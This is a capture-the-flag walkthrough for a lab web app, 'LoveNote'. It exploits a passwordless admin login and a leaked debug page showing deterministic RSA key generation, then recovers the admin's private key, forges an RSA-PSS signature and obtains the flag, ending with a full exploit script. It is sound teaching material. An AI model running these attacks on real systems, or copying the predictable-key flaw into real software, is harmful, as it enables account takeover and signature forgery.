# LoveNote — "Signed Messages" — Full Walkthrough

## 1. Recon

Fetch the landing page and pull out the navigation / structure:

```bash
B=http://10.48.146.85:5000
curl -s "$B/" | grep -iE 'href=|<h1|<p>' | sed 's/^[ \t]*//'
```

Key observations:

- It's a Flask app (`Server: Werkzeug/2.0.2 Python/3.10.12`).
- Marketing text: *"Every message digitally signed with RSA-2048 encryption."*
- Routes: `/messages`, `/verify`, `/login`, `/register`, `/about`, and (after login) `/dashboard`, `/compose`.

Read `/about` — it documents the crypto design:

```bash
curl -s "$B/about" | python3 -I -c "import sys,re,html;h=sys.stdin.read();h=re.sub(r'<style.*?</style>|<script.*?</script>','',h,flags=re.S);print(html.unescape(re.sub(r'[ \t]+',' ',re.sub(r'<[^>]+>',' ',h))))" | grep -iE 'rsa|sha|pss|sign|key'
```

> *"the text is hashed using SHA-256, and the hash is encrypted with your private key... PSS Padding Scheme."*

So signatures are **RSA-PSS over SHA-256**. PSS is secure — we cannot forge a signature without the private key. The attack must therefore be about **recovering a private key**, not breaking PSS.

---

## 2. Registration, login, and the session model

The registration form asks only for `username`, `full_name`, `email`, `bio` — **no password**:

```bash
curl -s "$B/register" | grep -oiE 'name="[^"]*"'
# username, full_name, email, bio
```

Register a user. The response is a **"Your Keys"** page that hands you a freshly generated RSA keypair (public **and** private):

```bash
curl -s -c u1.txt -b u1.txt \
  -d "username=cryptol1&full_name=C+L&email=c@l.com&bio=x" \
  "$B/register" > keys1.html

# Extract the PEM blocks
python3 -I -c "import re,html;h=open('keys1.html').read();[print(html.unescape(m)) for m in re.findall(r'-----BEGIN [A-Z ]*KEY-----.*?-----END [A-Z ]*KEY-----',h,re.S)]"
```

The Flask session cookie is just a signed `{"username": "..."}` blob (base64):

```
session=eyJ1c2VybmFtZSI6ImhhY2tlcnp6In0.<ts>.<hmac>
```

### Web finding: passwordless login (auth bypass)

`/login` also asks **only for a username**. Logging in as `admin` works with no credentials:

```bash
curl -s -i -c adm.txt -b adm.txt -d "username=admin" "$B/login" | grep -i location
# Location: .../dashboard  (Set-Cookie: "Welcome back, System Administrator!")
```

We are now admin — but admin's **inbox is empty**, so this alone yields no flag:

```bash
curl -s -b adm.txt "$B/dashboard" | python3 -I -c "import sys,re,html;h=sys.stdin.read();print(html.unescape(re.sub(r'[ \t]+',' ',re.sub(r'<[^>]+>',' ',re.sub(r'<style.*?</style>|<script.*?</script>','',h,flags=re.S)))))" | grep -iE 'inbox|flag|THM'
# Inbox (0)
```

The flag is gated behind the **cryptography** half of the challenge.

---

## 3. The target: admin's public key

Admin's public key is published on the profile page:

```bash
curl -s -b adm.txt "$B/profile/admin" | grep -A3 'BEGIN PUBLIC KEY'
```

```
-----BEGIN PUBLIC KEY-----
MFswDQYJKoZIhvcNAQEBBQADSgAwRwJAAaAWvmsqFsYJ5w1P4MD7NKiuZxsKi2zo
HUjT4uFoKxaN2FV4y+rOMrY07Ab75kNiRoOPxSXMH2diq1jHFa0FKwIDAQAB
-----END PUBLIC KEY-----
```

Decode `n` and `e`:

```bash
cat > admin_pub.pem <<'EOF'
-----BEGIN PUBLIC KEY-----
MFswDQYJKoZIhvcNAQEBBQADSgAwRwJAAaAWvmsqFsYJ5w1P4MD7NKiuZxsKi2zo
HUjT4uFoKxaN2FV4y+rOMrY07Ab75kNiRoOPxSXMH2diq1jHFa0FKwIDAQAB
-----END PUBLIC KEY-----
EOF

python3 -I - <<'PY'
from cryptography.hazmat.primitives.serialization import load_pem_public_key
k=load_pem_public_key(open('admin_pub.pem','rb').read()).public_numbers()
print("e    =", k.e)
print("n    =", k.n)
print("bits =", k.n.bit_length())
PY
```

Output:

```
e    = 65537
n    = 85126331932157837525567854053245460499291064536555820275957255468949993697387108905637573364855242718285589546535798832668842941372737201002956840568107
bits = 505
```

**The "RSA-2048" key is actually 505-bit.** That's weak, but still too large to factor with the General Number Field Sieve on a laptop.

### Dead ends worth ruling out

- **FactorDB:** no known factors.
- **Fermat (primes close together):** fails.
- **Batch-GCD / shared primes:** register 50 users, GCD every modulus against admin's `n` and pairwise — **zero** shared primes, so the primes are not drawn from a small pool.
- **Wiener (small `d`):** `e = 65537` is large, so `d` is large → N/A.

```bash
# (illustrative) batch-GCD check — all come back gcd == 1
python3 -I - <<'PY'
import urllib.request,urllib.parse,re,html,math,random,string
from cryptography.hazmat.primitives.serialization import load_pem_public_key
B="http://10.48.146.85:5000"
adm=85126331932157837525567854053245460499291064536555820275957255468949993697387108905637573364855242718285589546535798832668842941372737201002956840568107
def reg():
    u='u'+''.join(random.choice(string.ascii_lowercase) for _ in range(10))
    d=urllib.parse.urlencode({'username':u,'full_name':'X Y','email':u+'@x.com','bio':'x'}).encode()
    h=urllib.request.urlopen(urllib.request.Request(B+'/register',data=d),timeout=20).read().decode()
    m=re.search(r'-----BEGIN PUBLIC KEY-----.*?-----END PUBLIC KEY-----',h,re.S)
    return load_pem_public_key(html.unescape(m.group(0)).encode()).public_numbers().n
mods=[reg() for _ in range(50)]
print("shared with admin:", any(math.gcd(adm,n)!=1 for n in mods))
PY
```

Conclusion: pure math won't break this key. We need the **implementation detail** — which the web app leaks for us.

---

## 4. The web leak — exposed `/debug` endpoint

Content-discovery / guessing common routes finds a debug page that should never be in production:

```bash
curl -s -o /dev/null -w "%{http_code}\n" "$B/debug"   # 200
curl -s -b adm.txt "$B/debug" | python3 -I -c "import sys,re,html;print(html.unescape(re.sub(r'<[^>]+>',' ',re.sub(r'<style.*?</style>|<script.*?</script>','',sys.stdin.read(),flags=re.S))))"
```

The logs reveal the **exact key-generation algorithm**:

```
[2026-02-06 14:23:15] Development mode: ENABLED
[2026-02-06 14:23:15] Using deterministic key generation
[2026-02-06 14:23:15] Seed pattern: {username}_lovenote_2026_valentine
[DEBUG] Seed converted to bytes for cryptographic processing
[DEBUG] Seed hashed using SHA256 to produce large numeric material
[DEBUG] Prime p: Converting SHA256(seed) into a large integer,
        checking consecutive integers until a valid prime is reached
[DEBUG] Prime q: Modifying seed with PKI-related constant (SHA256(seed + b"pki")),
        then same next-prime search
[2026-02-06 14:23:16] RSA modulus generated from p × q
```

This is the whole vulnerability. The private key depends only on the **public** username:

```
seed = f"{username}_lovenote_2026_valentine"
p    = nextprime( int(SHA256(seed).hexdigest(), 16) )
q    = nextprime( int(SHA256(seed + b"pki").hexdigest(), 16) )
n    = p * q
```

SHA-256 → 256-bit primes → ~512-bit modulus, which matches the 505-bit `n` we saw.

---

## 5. Recovering admin's private key

Regenerate admin's primes and confirm `p * q` equals the published modulus **exactly**:

```bash
python3 -I - <<'PY'
import hashlib
from sympy import nextprime, isprime

admin_n = 85126331932157837525567854053245460499291064536555820275957255468949993697387108905637573364855242718285589546535798832668842941372737201002956840568107
seed = b"admin_lovenote_2026_valentine"

hp = int(hashlib.sha256(seed).hexdigest(), 16)
hq = int(hashlib.sha256(seed + b"pki").hexdigest(), 16)
p = hp if isprime(hp) else nextprime(hp)
q = hq if isprime(hq) else nextprime(hq)

print("match:", p * q == admin_n)
print("p =", p)
print("q =", q)
PY
```

```
match: True
p = 4791618204188744540991837585123847317681060752926508821153931923856376697043
q = 17765675040165337710763422425872010801055738292884264426719252999172010591049
```

`match: True` confirms we have fully recovered admin's private key.

---

## 6. Forging an admin signature (RSA-PSS / SHA-256)

Rebuild the RSA private key from `p`, `q`, `e` and sign an arbitrary message with the **same scheme** the server verifies (PSS + SHA-256). Save the signature as hex:

```bash
python3 -I - <<'PY'
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

p = 4791618204188744540991837585123847317681060752926508821153931923856376697043
q = 17765675040165337710763422425872010801055738292884264426719252999172010591049
e = 65537
n = p * q
d = pow(e, -1, (p-1)*(q-1))

priv = rsa.RSAPrivateNumbers(
    p, q, d, d % (p-1), d % (q-1), pow(q, -1, p),
    rsa.RSAPublicNumbers(e, n)
).private_key()

msg = b"I am the real admin"
sig = priv.sign(
    msg,
    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
    hashes.SHA256()
)
open("forge.txt", "w").write(sig.hex())

# sanity-check against admin's *real* published public key
pub = serialization.load_pem_public_key(open("admin_pub.pem", "rb").read())
pub.verify(sig, msg,
    padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH),
    hashes.SHA256())
print("local verify OK -> signature is valid under admin's real public key")
print("sig(hex):", sig.hex())
PY
```

The local `pub.verify(...)` succeeding proves the forged signature is valid under admin's **genuine** public key.

> Note: PSS is randomized (random salt), so each run produces a different valid signature. Any one of them works.

---

## 7. Submitting the forgery to `/verify` → flag

`/verify` takes `username`, `message`, and `signature` (hex). Submit the forged admin signature:

```bash
SIG=$(cat forge.txt)
curl -s -b adm.txt \
  --data-urlencode "username=admin" \
  --data-urlencode "message=I am the real admin" \
  --data-urlencode "signature=$SIG" \
  "$B/verify" | grep -oE 'THM\{[^}]*\}'
```

Result:

```
THM{PR3D1CT4BL3_S33D5_BR34K_H34RT5}
```

The server verifies our signature against admin's public key, accepts it as an authentic admin signature, and reveals the flag.

### 🚩 Flag

```
THM{PR3D1CT4BL3_S33D5_BR34K_H34RT5}
```

---

## 8. Full exploit script (end-to-end)

```python
#!/usr/bin/env python3
# exploit.py — recover admin's deterministic RSA key, forge a signature, grab the flag
import hashlib, re, requests
from sympy import nextprime, isprime
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

B = "http://10.48.146.85:5000"
s = requests.Session()

# 1) passwordless login as admin (web auth bypass)
s.post(f"{B}/login", data={"username": "admin"})

# 2) grab admin's published modulus
html = s.get(f"{B}/profile/admin").text
pem = re.search(r"-----BEGIN PUBLIC KEY-----.*?-----END PUBLIC KEY-----", html, re.S).group(0)
pub = serialization.load_pem_public_key(pem.encode())
admin_n = pub.public_numbers().n

# 3) regenerate admin's private key from the leaked deterministic scheme
seed = b"admin_lovenote_2026_valentine"
hp = int(hashlib.sha256(seed).hexdigest(), 16)
hq = int(hashlib.sha256(seed + b"pki").hexdigest(), 16)
p = hp if isprime(hp) else nextprime(hp)
q = hq if isprime(hq) else nextprime(hq)
assert p * q == admin_n, "key recovery failed"
e = 65537
d = pow(e, -1, (p - 1) * (q - 1))
priv = rsa.RSAPrivateNumbers(p, q, d, d % (p-1), d % (q-1), pow(q, -1, p),
                             rsa.RSAPublicNumbers(e, p*q)).private_key()

# 4) forge an admin PSS/SHA-256 signature
msg = b"I am the real admin"
sig = priv.sign(msg, padding.PSS(mgf=padding.MGF1(hashes.SHA256()),
                                 salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())

# 5) submit to /verify and extract the flag
r = s.post(f"{B}/verify", data={"username": "admin",
                                 "message": msg.decode(),
                                 "signature": sig.hex()})
print(re.search(r"THM\{[^}]*\}", r.text).group(0))
```

```bash
python3 exploit.py
# THM{PR3D1CT4BL3_S33D5_BR34K_H34RT5}
```

---

## 9. Attack chain summary

```
/about               → scheme is RSA-PSS/SHA-256 (unforgeable without private key)
/profile/admin       → admin public key (505-bit "RSA-2048")
   math attacks       → factoring / GCD / Fermat / Wiener all fail (keys are random-looking)
/debug  (exposed)    → leaks deterministic keygen: p,q = nextprime(SHA256(username-based seed))
   offline recovery   → regenerate admin's p,q → p*q matches n exactly → private key recovered
   forge              → sign arbitrary message with admin's key (PSS/SHA-256)
/verify              → server accepts forged admin signature → FLAG
```
